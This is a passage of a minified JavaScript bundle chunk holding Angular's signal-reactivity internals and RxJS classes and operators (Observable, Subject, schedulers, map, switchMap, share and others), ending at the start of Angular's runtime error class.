import{a as U,b as ue,c as ng,d as R,e as nD,f as ll,g as rD,h as iD,i as oD,j as rg,k as sD,l as za,m as ig,n as dl,o as aD,p as cD,q as og,r as Be,s as Oi,t as kn,u as hl,v as Ga,w as uD,x as lD,y as Ur,z as jt}from"./chunk-U3NIYLHF.js";function ug(n,e){return Object.is(n,e)}var ct=null,fl=!1,lg=1,Qt=Symbol("SIGNAL");function De(n){let e=ct;return ct=n,e}function dD(){return ct}var Ka={version:0,lastCleanEpoch:0,dirty:!1,producerNode:void 0,producerLastReadVersion:void 0,producerIndexOfThis:void 0,nextProducerIndex:0,liveConsumerNode:void 0,liveConsumerIndexOfThis:void 0,consumerAllowSignalWrites:!1,consumerIsAlwaysLive:!1,producerMustRecompute:()=>!1,producerRecomputeValue:()=>{},consumerMarkedDirty:()=>{},consumerOnSignalRead:()=>{}};function gl(n){if(fl)throw new Error("");if(ct===null)return;ct.consumerOnSignalRead(n);let e=ct.nextProducerIndex++;if(vl(ct),e<ct.producerNode.length&&ct.producerNode[e]!==n&&Wa(ct)){let t=ct.producerNode[e];yl(t,ct.producerIndexOfThis[e])}ct.producerNode[e]!==n&&(ct.producerNode[e]=n,ct.producerIndexOfThis[e]=Wa(ct)?pD(n,ct,e):0),ct.producerLastReadVersion[e]=n.version}function ON(){lg++}function dg(n){if(!(Wa(n)&&!n.dirty)&&!(!n.dirty&&n.lastCleanEpoch===lg)){if(!n.producerMustRecompute(n)&&!fg(n)){cg(n);return}n.producerRecomputeValue(n),cg(n)}}function hD(n){if(n.liveConsumerNode===void 0)return;let e=fl;fl=!0;try{for(let t of n.liveConsumerNode)t.dirty||FN(t)}finally{fl=e}}function fD(){return ct?.consumerAllowSignalWrites!==!1}function FN(n){n.dirty=!0,hD(n),n.consumerMarkedDirty?.(n)}function cg(n){n.dirty=!1,n.lastCleanEpoch=lg}function ml(n){return n&&(n.nextProducerIndex=0),De(n)}function hg(n,e){if(De(e),!(!n||n.producerNode===void 0||n.producerIndexOfThis===void 0||n.producerLastReadVersion===void 0)){if(Wa(n))for(let t=n.nextProducerIndex;t<n.producerNode.length;t++)yl(n.producerNode[t],n.producerIndexOfThis[t]);for(;n.producerNode.length>n.nextProducerIndex;)n.producerNode.pop(),n.producerLastReadVersion.pop(),n.producerIndexOfThis.pop()}}function fg(n){vl(n);for(let e=0;e<n.producerNode.length;e++){let t=n.producerNode[e],r=n.producerLastReadVersion[e];if(r!==t.version||(dg(t),r!==t.version))return!0}return!1}function pg(n){if(vl(n),Wa(n))for(let e=0;e<n.producerNode.length;e++)yl(n.producerNode[e],n.producerIndexOfThis[e]);n.producerNode.length=n.producerLastReadVersion.length=n.producerIndexOfThis.length=0,n.liveConsumerNode&&(n.liveConsumerNode.length=n.liveConsumerIndexOfThis.length=0)}function pD(n,e,t){if(gD(n),n.liveConsumerNode.length===0&&mD(n))for(let r=0;r<n.producerNode.length;r++)n.producerIndexOfThis[r]=pD(n.producerNode[r],n,r);return n.liveConsumerIndexOfThis.push(t),n.liveConsumerNode.push(e)-1}function yl(n,e){if(gD(n),n.liveConsumerNode.length===1&&mD(n))for(let r=0;r<n.producerNode.length;r++)yl(n.producerNode[r],n.producerIndexOfThis[r]);let t=n.liveConsumerNode.length-1;if(n.liveConsumerNode[e]=n.liveConsumerNode[t],n.liveConsumerIndexOfThis[e]=n.liveConsumerIndexOfThis[t],n.liveConsumerNode.length--,n.liveConsumerIndexOfThis.length--,e<n.liveConsumerNode.length){let r=n.liveConsumerIndexOfThis[e],i=n.liveConsumerNode[e];vl(i),i.producerIndexOfThis[r]=e}}function Wa(n){return n.consumerIsAlwaysLive||(n?.liveConsumerNode?.length??0)>0}function vl(n){n.producerNode??=[],n.producerIndexOfThis??=[],n.producerLastReadVersion??=[]}function gD(n){n.liveConsumerNode??=[],n.liveConsumerIndexOfThis??=[]}function mD(n){return n.producerNode!==void 0}function yD(n){let e=Object.create(VN);e.computation=n;let t=()=>{if(dg(e),gl(e),e.value===pl)throw e.error;return e.value};return t[Qt]=e,t}var sg=Symbol("UNSET"),ag=Symbol("COMPUTING"),pl=Symbol("ERRORED"),VN=ue(U({},Ka),{value:sg,dirty:!0,error:null,equal:ug,producerMustRecompute(n){return n.value===sg||n.value===ag},producerRecomputeValue(n){if(n.value===ag)throw new Error("Detected cycle in computations.");let e=n.value;n.value=ag;let t=ml(n),r;try{r=n.computation()}catch(i){r=pl,n.error=i}finally{hg(n,t)}if(e!==sg&&e!==pl&&r!==pl&&n.equal(e,r)){n.value=e;return}n.value=r,n.version++}});function LN(){throw new Error}var vD=LN;function _D(){vD()}function wD(n){vD=n}var UN=null;function ED(n){let e=Object.create(gg);e.value=n;let t=()=>(gl(e),e.value);return t[Qt]=e,t}function _l(n,e){fD()||_D(),n.equal(n.value,e)||(n.value=e,jN(n))}function ID(n,e){fD()||_D(),_l(n,e(n.value))}var gg=ue(U({},Ka),{equal:ug,value:void 0});function jN(n){n.version++,ON(),hD(n),UN?.()}function ne(n){return typeof n=="function"}function Fo(n){let t=n(r=>{Error.call(r),r.stack=new Error().stack});return t.prototype=Object.create(Error.prototype),t.prototype.constructor=t,t}var wl=Fo(n=>function(t){n(this),this.message=t?`${t.length} errors occurred during unsubscription:
${t.map((r,i)=>`${i+1}) ${r.toString()}`).join(`
  `)}`:"",this.name="UnsubscriptionError",this.errors=t});function Fi(n,e){if(n){let t=n.indexOf(e);0<=t&&n.splice(t,1)}}var ze=class n{constructor(e){this.initialTeardown=e,this.closed=!1,this._parentage=null,this._finalizers=null}unsubscribe(){let e;if(!this.closed){this.closed=!0;let{_parentage:t}=this;if(t)if(this._parentage=null,Array.isArray(t))for(let o of t)o.remove(this);else t.remove(this);let{initialTeardown:r}=this;if(ne(r))try{r()}catch(o){e=o instanceof wl?o.errors:[o]}let{_finalizers:i}=this;if(i){this._finalizers=null;for(let o of i)try{DD(o)}catch(s){e=e??[],s instanceof wl?e=[...e,...s.errors]:e.push(s)}}if(e)throw new wl(e)}}add(e){var t;if(e&&e!==this)if(this.closed)DD(e);else{if(e instanceof n){if(e.closed||e._hasParent(this))return;e._addParent(this)}(this._finalizers=(t=this._finalizers)!==null&&t!==void 0?t:[]).push(e)}}_hasParent(e){let{_parentage:t}=this;return t===e||Array.isArray(t)&&t.includes(e)}_addParent(e){let{_parentage:t}=this;this._parentage=Array.isArray(t)?(t.push(e),t):t?[t,e]:e}_removeParent(e){let{_parentage:t}=this;t===e?this._parentage=null:Array.isArray(t)&&Fi(t,e)}remove(e){let{_finalizers:t}=this;t&&Fi(t,e),e instanceof n&&e._removeParent(this)}};ze.EMPTY=(()=>{let n=new ze;return n.closed=!0,n})();var mg=ze.EMPTY;function El(n){return n instanceof ze||n&&"closed"in n&&ne(n.remove)&&ne(n.add)&&ne(n.unsubscribe)}function DD(n){ne(n)?n():n.unsubscribe()}var _n={onUnhandledError:null,onStoppedNotification:null,Promise:void 0,useDeprecatedSynchronousErrorHandling:!1,useDeprecatedNextContext:!1};var Vo={setTimeout(n,e,...t){let{delegate:r}=Vo;return r?.setTimeout?r.setTimeout(n,e,...t):setTimeout(n,e,...t)},clearTimeout(n){let{delegate:e}=Vo;return(e?.clearTimeout||clearTimeout)(n)},delegate:void 0};function Il(n){Vo.setTimeout(()=>{let{onUnhandledError:e}=_n;if(e)e(n);else throw n})}function Qa(){}var CD=yg("C",void 0,void 0);function bD(n){return yg("E",void 0,n)}function TD(n){return yg("N",n,void 0)}function yg(n,e,t){return{kind:n,value:e,error:t}}var Vi=null;function Lo(n){if(_n.useDeprecatedSynchronousErrorHandling){let e=!Vi;if(e&&(Vi={errorThrown:!1,error:null}),n(),e){let{errorThrown:t,error:r}=Vi;if(Vi=null,t)throw r}}else n()}function SD(n){_n.useDeprecatedSynchronousErrorHandling&&Vi&&(Vi.errorThrown=!0,Vi.error=n)}var Li=class extends ze{constructor(e){super(),this.isStopped=!1,e?(this.destination=e,El(e)&&e.add(this)):this.destination=HN}static create(e,t,r){return new rr(e,t,r)}next(e){this.isStopped?_g(TD(e),this):this._next(e)}error(e){this.isStopped?_g(bD(e),this):(this.isStopped=!0,this._error(e))}complete(){this.isStopped?_g(CD,this):(this.isStopped=!0,this._complete())}unsubscribe(){this.closed||(this.isStopped=!0,super.unsubscribe(),this.destination=null)}_next(e){this.destination.next(e)}_error(e){try{this.destination.error(e)}finally{this.unsubscribe()}}_complete(){try{this.destination.complete()}finally{this.unsubscribe()}}},BN=Function.prototype.bind;function vg(n,e){return BN.call(n,e)}var wg=class{constructor(e){this.partialObserver=e}next(e){let{partialObserver:t}=this;if(t.next)try{t.next(e)}catch(r){Dl(r)}}error(e){let{partialObserver:t}=this;if(t.error)try{t.error(e)}catch(r){Dl(r)}else Dl(e)}complete(){let{partialObserver:e}=this;if(e.complete)try{e.complete()}catch(t){Dl(t)}}},rr=class extends Li{constructor(e,t,r){super();let i;if(ne(e)||!e)i={next:e??void 0,error:t??void 0,complete:r??void 0};else{let o;this&&_n.useDeprecatedNextContext?(o=Object.create(e),o.unsubscribe=()=>this.unsubscribe(),i={next:e.next&&vg(e.next,o),error:e.error&&vg(e.error,o),complete:e.complete&&vg(e.complete,o)}):i=e}this.destination=new wg(i)}};function Dl(n){_n.useDeprecatedSynchronousErrorHandling?SD(n):Il(n)}function $N(n){throw n}function _g(n,e){let{onStoppedNotification:t}=_n;t&&Vo.setTimeout(()=>t(n,e))}var HN={closed:!0,next:Qa,error:$N,complete:Qa};var Uo=typeof Symbol=="function"&&Symbol.observable||"@@observable";function xt(n){return n}function Eg(...n){return Ig(n)}function Ig(n){return n.length===0?xt:n.length===1?n[0]:function(t){return n.reduce((r,i)=>i(r),t)}}var se=(()=>{class n{constructor(t){t&&(this._subscribe=t)}lift(t){let r=new n;return r.source=this,r.operator=t,r}subscribe(t,r,i){let o=zN(t)?t:new rr(t,r,i);return Lo(()=>{let{operator:s,source:a}=this;o.add(s?s.call(o,a):a?this._subscribe(o):this._trySubscribe(o))}),o}_trySubscribe(t){try{return this._subscribe(t)}catch(r){t.error(r)}}forEach(t,r){return r=AD(r),new r((i,o)=>{let s=new rr({next:a=>{try{t(a)}catch(c){o(c),s.unsubscribe()}},error:o,complete:i});this.subscribe(s)})}_subscribe(t){var r;return(r=this.source)===null||r===void 0?void 0:r.subscribe(t)}[Uo](){return this}pipe(...t){return Ig(t)(this)}toPromise(t){return t=AD(t),new t((r,i)=>{let o;this.subscribe(s=>o=s,s=>i(s),()=>r(o))})}}return n.create=e=>new n(e),n})();function AD(n){var e;return(e=n??_n.Promise)!==null&&e!==void 0?e:Promise}function qN(n){return n&&ne(n.next)&&ne(n.error)&&ne(n.complete)}function zN(n){return n&&n instanceof Li||qN(n)&&El(n)}function Dg(n){return ne(n?.lift)}function ae(n){return e=>{if(Dg(e))return e.lift(function(t){try{return n(t,this)}catch(r){this.error(r)}});throw new TypeError("Unable to lift unknown Observable type")}}function ce(n,e,t,r,i){return new Cg(n,e,t,r,i)}var Cg=class extends Li{constructor(e,t,r,i,o,s){super(e),this.onFinalize=o,this.shouldUnsubscribe=s,this._next=t?function(a){try{t(a)}catch(c){e.error(c)}}:super._next,this._error=i?function(a){try{i(a)}catch(c){e.error(c)}finally{this.unsubscribe()}}:super._error,this._complete=r?function(){try{r()}catch(a){e.error(a)}finally{this.unsubscribe()}}:super._complete}unsubscribe(){var e;if(!this.shouldUnsubscribe||this.shouldUnsubscribe()){let{closed:t}=this;super.unsubscribe(),!t&&((e=this.onFinalize)===null||e===void 0||e.call(this))}}};function jo(){return ae((n,e)=>{let t=null;n._refCount++;let r=ce(e,void 0,void 0,void 0,()=>{if(!n||n._refCount<=0||0<--n._refCount){t=null;return}let i=n._connection,o=t;t=null,i&&(!o||i===o)&&i.unsubscribe(),e.unsubscribe()});n.subscribe(r),r.closed||(t=n.connect())})}var Bo=class extends se{constructor(e,t){super(),this.source=e,this.subjectFactory=t,this._subject=null,this._refCount=0,this._connection=null,Dg(e)&&(this.lift=e.lift)}_subscribe(e){return this.getSubject().subscribe(e)}getSubject(){let e=this._subject;return(!e||e.isStopped)&&(this._subject=this.subjectFactory()),this._subject}_teardown(){this._refCount=0;let{_connection:e}=this;this._subject=this._connection=null,e?.unsubscribe()}connect(){let e=this._connection;if(!e){e=this._connection=new ze;let t=this.getSubject();e.add(this.source.subscribe(ce(t,void 0,()=>{this._teardown(),t.complete()},r=>{this._teardown(),t.error(r)},()=>this._teardown()))),e.closed&&(this._connection=null,e=ze.EMPTY)}return e}refCount(){return jo()(this)}};var MD=Fo(n=>function(){n(this),this.name="ObjectUnsubscribedError",this.message="object unsubscribed"});var Ve=(()=>{class n extends se{constructor(){super(),this.closed=!1,this.currentObservers=null,this.observers=[],this.isStopped=!1,this.hasError=!1,this.thrownError=null}lift(t){let r=new Cl(this,this);return r.operator=t,r}_throwIfClosed(){if(this.closed)throw new MD}next(t){Lo(()=>{if(this._throwIfClosed(),!this.isStopped){this.currentObservers||(this.currentObservers=Array.from(this.observers));for(let r of this.currentObservers)r.next(t)}})}error(t){Lo(()=>{if(this._throwIfClosed(),!this.isStopped){this.hasError=this.isStopped=!0,this.thrownError=t;let{observers:r}=this;for(;r.length;)r.shift().error(t)}})}complete(){Lo(()=>{if(this._throwIfClosed(),!this.isStopped){this.isStopped=!0;let{observers:t}=this;for(;t.length;)t.shift().complete()}})}unsubscribe(){this.isStopped=this.closed=!0,this.observers=this.currentObservers=null}get observed(){var t;return((t=this.observers)===null||t===void 0?void 0:t.length)>0}_trySubscribe(t){return this._throwIfClosed(),super._trySubscribe(t)}_subscribe(t){return this._throwIfClosed(),this._checkFinalizedStatuses(t),this._innerSubscribe(t)}_innerSubscribe(t){let{hasError:r,isStopped:i,observers:o}=this;return r||i?mg:(this.currentObservers=null,o.push(t),new ze(()=>{this.currentObservers=null,Fi(o,t)}))}_checkFinalizedStatuses(t){let{hasError:r,thrownError:i,isStopped:o}=this;r?t.error(i):o&&t.complete()}asObservable(){let t=new se;return t.source=this,t}}return n.create=(e,t)=>new Cl(e,t),n})(),Cl=class extends Ve{constructor(e,t){super(),this.destination=e,this.source=t}next(e){var t,r;(r=(t=this.destination)===null||t===void 0?void 0:t.next)===null||r===void 0||r.call(t,e)}error(e){var t,r;(r=(t=this.destination)===null||t===void 0?void 0:t.error)===null||r===void 0||r.call(t,e)}complete(){var e,t;(t=(e=this.destination)===null||e===void 0?void 0:e.complete)===null||t===void 0||t.call(e)}_subscribe(e){var t,r;return(r=(t=this.source)===null||t===void 0?void 0:t.subscribe(e))!==null&&r!==void 0?r:mg}};var gt=class extends Ve{constructor(e){super(),this._value=e}get value(){return this.getValue()}_subscribe(e){let t=super._subscribe(e);return!t.closed&&e.next(this._value),t}getValue(){let{hasError:e,thrownError:t,_value:r}=this;if(e)throw t;return this._throwIfClosed(),r}next(e){super.next(this._value=e)}};var Ya={now(){return(Ya.delegate||Date).now()},delegate:void 0};var bl=class extends Ve{constructor(e=1/0,t=1/0,r=Ya){super(),this._bufferSize=e,this._windowTime=t,this._timestampProvider=r,this._buffer=[],this._infiniteTimeWindow=!0,this._infiniteTimeWindow=t===1/0,this._bufferSize=Math.max(1,e),this._windowTime=Math.max(1,t)}next(e){let{isStopped:t,_buffer:r,_infiniteTimeWindow:i,_timestampProvider:o,_windowTime:s}=this;t||(r.push(e),!i&&r.push(o.now()+s)),this._trimBuffer(),super.next(e)}_subscribe(e){this._throwIfClosed(),this._trimBuffer();let t=this._innerSubscribe(e),{_infiniteTimeWindow:r,_buffer:i}=this,o=i.slice();for(let s=0;s<o.length&&!e.closed;s+=r?1:2)e.next(o[s]);return this._checkFinalizedStatuses(e),t}_trimBuffer(){let{_bufferSize:e,_timestampProvider:t,_buffer:r,_infiniteTimeWindow:i}=this,o=(i?1:2)*e;if(e<1/0&&o<r.length&&r.splice(0,r.length-o),!i){let s=t.now(),a=0;for(let c=1;c<r.length&&r[c]<=s;c+=2)a=c;a&&r.splice(0,a+1)}}};var Tl=class extends ze{constructor(e,t){super()}schedule(e,t=0){return this}};var Za={setInterval(n,e,...t){let{delegate:r}=Za;return r?.setInterval?r.setInterval(n,e,...t):setInterval(n,e,...t)},clearInterval(n){let{delegate:e}=Za;return(e?.clearInterval||clearInterval)(n)},delegate:void 0};var $o=class extends Tl{constructor(e,t){super(e,t),this.scheduler=e,this.work=t,this.pending=!1}schedule(e,t=0){var r;if(this.closed)return this;this.state=e;let i=this.id,o=this.scheduler;return i!=null&&(this.id=this.recycleAsyncId(o,i,t)),this.pending=!0,this.delay=t,this.id=(r=this.id)!==null&&r!==void 0?r:this.requestAsyncId(o,this.id,t),this}requestAsyncId(e,t,r=0){return Za.setInterval(e.flush.bind(e,this),r)}recycleAsyncId(e,t,r=0){if(r!=null&&this.delay===r&&this.pending===!1)return t;t!=null&&Za.clearInterval(t)}execute(e,t){if(this.closed)return new Error("executing a cancelled action");this.pending=!1;let r=this._execute(e,t);if(r)return r;this.pending===!1&&this.id!=null&&(this.id=this.recycleAsyncId(this.scheduler,this.id,null))}_execute(e,t){let r=!1,i;try{this.work(e)}catch(o){r=!0,i=o||new Error("Scheduled action threw falsy error")}if(r)return this.unsubscribe(),i}unsubscribe(){if(!this.closed){let{id:e,scheduler:t}=this,{actions:r}=t;this.work=this.state=this.scheduler=null,this.pending=!1,Fi(r,this),e!=null&&(this.id=this.recycleAsyncId(t,e,null)),this.delay=null,super.unsubscribe()}}};var Ho=class n{constructor(e,t=n.now){this.schedulerActionCtor=e,this.now=t}schedule(e,t=0,r){return new this.schedulerActionCtor(this,e).schedule(r,t)}};Ho.now=Ya.now;var qo=class extends Ho{constructor(e,t=Ho.now){super(e,t),this.actions=[],this._active=!1}flush(e){let{actions:t}=this;if(this._active){t.push(e);return}let r;this._active=!0;do if(r=e.execute(e.state,e.delay))break;while(e=t.shift());if(this._active=!1,r){for(;e=t.shift();)e.unsubscribe();throw r}}};var Ja=new qo($o);var Sl=class extends $o{constructor(e,t){super(e,t),this.scheduler=e,this.work=t}schedule(e,t=0){return t>0?super.schedule(e,t):(this.delay=t,this.state=e,this.scheduler.flush(this),this)}execute(e,t){return t>0||this.closed?super.execute(e,t):this._execute(e,t)}requestAsyncId(e,t,r=0){return r!=null&&r>0||r==null&&this.delay>0?super.requestAsyncId(e,t,r):(e.flush(this),0)}};var Al=class extends qo{};var bg=new Al(Sl);var Rt=new se(n=>n.complete());function xD(n){return n&&ne(n.schedule)}function Tg(n){return n[n.length-1]}function Ml(n){return ne(Tg(n))?n.pop():void 0}function On(n){return xD(Tg(n))?n.pop():void 0}function RD(n,e){return typeof Tg(n)=="number"?n.pop():e}var xl=n=>n&&typeof n.length=="number"&&typeof n!="function";function Rl(n){return ne(n?.then)}function Nl(n){return ne(n[Uo])}function Pl(n){return Symbol.asyncIterator&&ne(n?.[Symbol.asyncIterator])}function kl(n){return new TypeError(`You provided ${n!==null&&typeof n=="object"?"an invalid object":`'${n}'`} where a stream was expected. You can provide an Observable, Promise, ReadableStream, Array, AsyncIterable, or Iterable.`)}function GN(){return typeof Symbol!="function"||!Symbol.iterator?"@@iterator":Symbol.iterator}var Ol=GN();function Fl(n){return ne(n?.[Ol])}function Vl(n){return rD(this,arguments,function*(){let t=n.getReader();try{for(;;){let{value:r,done:i}=yield ll(t.read());if(i)return yield ll(void 0);yield yield ll(r)}}finally{t.releaseLock()}})}function Ll(n){return ne(n?.getReader)}function Oe(n){if(n instanceof se)return n;if(n!=null){if(Nl(n))return WN(n);if(xl(n))return KN(n);if(Rl(n))return QN(n);if(Pl(n))return ND(n);if(Fl(n))return YN(n);if(Ll(n))return ZN(n)}throw kl(n)}function WN(n){return new se(e=>{let t=n[Uo]();if(ne(t.subscribe))return t.subscribe(e);throw new TypeError("Provided object does not correctly implement Symbol.observable")})}function KN(n){return new se(e=>{for(let t=0;t<n.length&&!e.closed;t++)e.next(n[t]);e.complete()})}function QN(n){return new se(e=>{n.then(t=>{e.closed||(e.next(t),e.complete())},t=>e.error(t)).then(null,Il)})}function YN(n){return new se(e=>{for(let t of n)if(e.next(t),e.closed)return;e.complete()})}function ND(n){return new se(e=>{JN(n,e).catch(t=>e.error(t))})}function ZN(n){return ND(Vl(n))}function JN(n,e){var t,r,i,o;return nD(this,void 0,void 0,function*(){try{for(t=iD(n);r=yield t.next(),!r.done;){let s=r.value;if(e.next(s),e.closed)return}}catch(s){i={error:s}}finally{try{r&&!r.done&&(o=t.return)&&(yield o.call(t))}finally{if(i)throw i.error}}e.complete()})}function Bt(n,e,t,r=0,i=!1){let o=e.schedule(function(){t(),i?n.add(this.schedule(null,r)):this.unsubscribe()},r);if(n.add(o),!i)return o}function sn(n,e=0){return ae((t,r)=>{t.subscribe(ce(r,i=>Bt(r,n,()=>r.next(i),e),()=>Bt(r,n,()=>r.complete(),e),i=>Bt(r,n,()=>r.error(i),e)))})}function wn(n,e=0){return ae((t,r)=>{r.add(n.schedule(()=>t.subscribe(r),e))})}function PD(n,e){return Oe(n).pipe(wn(e),sn(e))}function kD(n,e){return Oe(n).pipe(wn(e),sn(e))}function OD(n,e){return new se(t=>{let r=0;return e.schedule(function(){r===n.length?t.complete():(t.next(n[r++]),t.closed||this.schedule())})})}function FD(n,e){return new se(t=>{let r;return Bt(t,e,()=>{r=n[Ol](),Bt(t,e,()=>{let i,o;try{({value:i,done:o}=r.next())}catch(s){t.error(s);return}o?t.complete():t.next(i)},0,!0)}),()=>ne(r?.return)&&r.return()})}function Ul(n,e){if(!n)throw new Error("Iterable cannot be null");return new se(t=>{Bt(t,e,()=>{let r=n[Symbol.asyncIterator]();Bt(t,e,()=>{r.next().then(i=>{i.done?t.complete():t.next(i.value)})},0,!0)})})}function VD(n,e){return Ul(Vl(n),e)}function LD(n,e){if(n!=null){if(Nl(n))return PD(n,e);if(xl(n))return OD(n,e);if(Rl(n))return kD(n,e);if(Pl(n))return Ul(n,e);if(Fl(n))return FD(n,e);if(Ll(n))return VD(n,e)}throw kl(n)}function me(n,e){return e?LD(n,e):Oe(n)}function J(...n){let e=On(n);return me(n,e)}function zo(n,e){let t=ne(n)?n:()=>n,r=i=>i.error(t());return new se(e?i=>e.schedule(r,0,i):r)}function Sg(n){return!!n&&(n instanceof se||ne(n.lift)&&ne(n.subscribe))}var ir=Fo(n=>function(){n(this),this.name="EmptyError",this.message="no elements in sequence"});function X(n,e){return ae((t,r)=>{let i=0;t.subscribe(ce(r,o=>{r.next(n.call(e,o,i++))}))})}var{isArray:XN}=Array;function eP(n,e){return XN(e)?n(...e):n(e)}function jl(n){return X(e=>eP(n,e))}var{isArray:tP}=Array,{getPrototypeOf:nP,prototype:rP,keys:iP}=Object;function Bl(n){if(n.length===1){let e=n[0];if(tP(e))return{args:e,keys:null};if(oP(e)){let t=iP(e);return{args:t.map(r=>e[r]),keys:t}}}return{args:n,keys:null}}function oP(n){return n&&typeof n=="object"&&nP(n)===rP}function $l(n,e){return n.reduce((t,r,i)=>(t[r]=e[i],t),{})}function Xa(...n){let e=On(n),t=Ml(n),{args:r,keys:i}=Bl(n);if(r.length===0)return me([],e);let o=new se(sP(r,e,i?s=>$l(i,s):xt));return t?o.pipe(jl(t)):o}function sP(n,e,t=xt){return r=>{UD(e,()=>{let{length:i}=n,o=new Array(i),s=i,a=i;for(let c=0;c<i;c++)UD(e,()=>{let l=me(n[c],e),h=!1;l.subscribe(ce(r,p=>{o[c]=p,h||(h=!0,a--),a||r.next(t(o.slice()))},()=>{--s||r.complete()}))},r)},r)}}function UD(n,e,t){n?Bt(t,n,e):e()}function jD(n,e,t,r,i,o,s,a){let c=[],l=0,h=0,p=!1,m=()=>{p&&!c.length&&!l&&e.complete()},y=b=>l<r?D(b):c.push(b),D=b=>{o&&e.next(b),l++;let T=!1;Oe(t(b,h++)).subscribe(ce(e,F=>{i?.(F),o?y(F):e.next(F)},()=>{T=!0},void 0,()=>{if(T)try{for(l--;c.length&&l<r;){let F=c.shift();s?Bt(e,s,()=>D(F)):D(F)}m()}catch(F){e.error(F)}}))};return n.subscribe(ce(e,y,()=>{p=!0,m()})),()=>{a?.()}}function tt(n,e,t=1/0){return ne(e)?tt((r,i)=>X((o,s)=>e(r,o,i,s))(Oe(n(r,i))),t):(typeof e=="number"&&(t=e),ae((r,i)=>jD(r,i,n,t)))}function jr(n=1/0){return tt(xt,n)}function BD(){return jr(1)}function Go(...n){return BD()(me(n,On(n)))}function Hl(n){return new se(e=>{Oe(n()).subscribe(e)})}function Ag(...n){let e=Ml(n),{args:t,keys:r}=Bl(n),i=new se(o=>{let{length:s}=t;if(!s){o.complete();return}let a=new Array(s),c=s,l=s;for(let h=0;h<s;h++){let p=!1;Oe(t[h]).subscribe(ce(o,m=>{p||(p=!0,l--),a[h]=m},()=>c--,void 0,()=>{(!c||!p)&&(l||o.next(r?$l(r,a):a),o.complete())}))}});return e?i.pipe(jl(e)):i}function Mg(...n){let e=On(n),t=RD(n,1/0),r=n;return r.length?r.length===1?Oe(r[0]):jr(t)(me(r,e)):Rt}function ut(n,e){return ae((t,r)=>{let i=0;t.subscribe(ce(r,o=>n.call(e,o,i++)&&r.next(o)))})}function Br(n){return ae((e,t)=>{let r=null,i=!1,o;r=e.subscribe(ce(t,void 0,void 0,s=>{o=Oe(n(s,Br(n)(e))),r?(r.unsubscribe(),r=null,o.subscribe(t)):i=!0})),i&&(r.unsubscribe(),r=null,o.subscribe(t))})}function $D(n,e,t,r,i){return(o,s)=>{let a=t,c=e,l=0;o.subscribe(ce(s,h=>{let p=l++;c=a?n(c,h,p):(a=!0,h),r&&s.next(c)},i&&(()=>{a&&s.next(c),s.complete()})))}}function or(n,e){return ne(e)?tt(n,e,1):tt(n,1)}function $r(n){return ae((e,t)=>{let r=!1;e.subscribe(ce(t,i=>{r=!0,t.next(i)},()=>{r||t.next(n),t.complete()}))})}function sr(n){return n<=0?()=>Rt:ae((e,t)=>{let r=0;e.subscribe(ce(t,i=>{++r<=n&&(t.next(i),n<=r&&t.complete())}))})}function xg(n){return X(()=>n)}function Rg(n,e=xt){return n=n??aP,ae((t,r)=>{let i,o=!0;t.subscribe(ce(r,s=>{let a=e(s);(o||!n(i,a))&&(o=!1,i=a,r.next(s))}))})}function aP(n,e){return n===e}function ql(n=cP){return ae((e,t)=>{let r=!1;e.subscribe(ce(t,i=>{r=!0,t.next(i)},()=>r?t.complete():t.error(n())))})}function cP(){return new ir}function Hr(n){return ae((e,t)=>{try{e.subscribe(t)}finally{t.add(n)}})}function an(n,e){let t=arguments.length>=2;return r=>r.pipe(n?ut((i,o)=>n(i,o,r)):xt,sr(1),t?$r(e):ql(()=>new ir))}function Wo(n){return n<=0?()=>Rt:ae((e,t)=>{let r=[];e.subscribe(ce(t,i=>{r.push(i),n<r.length&&r.shift()},()=>{for(let i of r)t.next(i);t.complete()},void 0,()=>{r=null}))})}function Ng(n,e){let t=arguments.length>=2;return r=>r.pipe(n?ut((i,o)=>n(i,o,r)):xt,Wo(1),t?$r(e):ql(()=>new ir))}function ec(){return ae((n,e)=>{let t,r=!1;n.subscribe(ce(e,i=>{let o=t;t=i,r&&e.next([o,i]),r=!0}))})}function Ui(n,e){return ae($D(n,e,arguments.length>=2,!0))}function HD(n={}){let{connector:e=()=>new Ve,resetOnError:t=!0,resetOnComplete:r=!0,resetOnRefCountZero:i=!0}=n;return o=>{let s,a,c,l=0,h=!1,p=!1,m=()=>{a?.unsubscribe(),a=void 0},y=()=>{m(),s=c=void 0,h=p=!1},D=()=>{let b=s;y(),b?.unsubscribe()};return ae((b,T)=>{l++,!p&&!h&&m();let F=c=c??e();T.add(()=>{l--,l===0&&!p&&!h&&(a=Pg(D,i))}),F.subscribe(T),!s&&l>0&&(s=new rr({next:$=>F.next($),error:$=>{p=!0,m(),a=Pg(y,t,$),F.error($)},complete:()=>{h=!0,m(),a=Pg(y,r),F.complete()}}),Oe(b).subscribe(s))})(o)}}function Pg(n,e,...t){if(e===!0){n();return}if(e===!1)return;let r=new rr({next:()=>{r.unsubscribe(),n()}});return Oe(e(...t)).subscribe(r)}function zl(n,e,t){let r,i=!1;return n&&typeof n=="object"?{bufferSize:r=1/0,windowTime:e=1/0,refCount:i=!1,scheduler:t}=n:r=n??1/0,HD({connector:()=>new bl(r,e,t),resetOnError:!0,resetOnComplete:!1,resetOnRefCountZero:i})}function ji(...n){let e=On(n);return ae((t,r)=>{(e?Go(n,t,e):Go(n,t)).subscribe(r)})}function Le(n,e){return ae((t,r)=>{let i=null,o=0,s=!1,a=()=>s&&!i&&r.complete();t.subscribe(ce(r,c=>{i?.unsubscribe();let l=0,h=o++;Oe(n(c,h)).subscribe(i=ce(r,p=>r.next(e?e(c,p,h,l++):p),()=>{i=null,a()}))},()=>{s=!0,a()}))})}function Gl(n,e){return ne(e)?Le(()=>n,e):Le(()=>n)}function kg(n){return ae((e,t)=>{Oe(n).subscribe(ce(t,()=>t.complete(),Qa)),!t.closed&&e.subscribe(t)})}function nt(n,e,t){let r=ne(n)||e||t?{next:n,error:e,complete:t}:n;return r?ae((i,o)=>{var s;(s=r.subscribe)===null||s===void 0||s.call(r);let a=!0;i.subscribe(ce(o,c=>{var l;(l=r.next)===null||l===void 0||l.call(r,c),o.next(c)},()=>{var c;a=!1,(c=r.complete)===null||c===void 0||c.call(r),o.complete()},c=>{var l;a=!1,(l=r.error)===null||l===void 0||l.call(r,c),o.error(c)},()=>{var c,l;a&&((c=r.unsubscribe)===null||c===void 0||c.call(r)),(l=r.finalize)===null||l===void 0||l.call(r)}))}):xt}var uP="https://g.co/ng/security#xss",Y=class extends Error{code;constructor(e,t){super(Md(e,t)),this.code=e}};function Md(n,e){return`${`NG0${Math.abs(n)}`}${e?": "+e:""}`}var 